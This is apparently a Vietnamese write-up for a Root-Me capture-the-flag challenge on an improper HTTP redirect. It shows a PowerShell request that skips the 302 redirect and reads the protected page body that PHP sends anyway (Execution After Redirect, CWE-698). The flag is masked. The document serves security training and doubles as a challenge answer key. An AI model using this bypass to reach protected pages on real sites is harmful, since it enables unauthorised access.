# HTTP - Improper redirect

## Solution

- Khi bắt đầu đọc mô tả và tiêu đề, có một `improper redirect`

- Lời giải rất dễ, cần sử dụng `invoke-webrequest` với tùy chọn `MaximumRedirection` được đặt thành 0

```
(invoke-webrequest -uri "http://challenge01.root-me.org/web-serveur/ch32/"  -MaximumRedirection 0).rawContent
```

- Bây giờ đã có flag!

```
HTTP/1.1 302 Found
Transfer-Encoding: chunked
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Sat, 29 Dec 2018 23:02:20 GMT
Location: ./login.php?redirect
Server: nginx

<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'
></iframe>
<h1>Welcome !</h1>

<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
<p>The flag is : ****</p>
</body>
</html>
```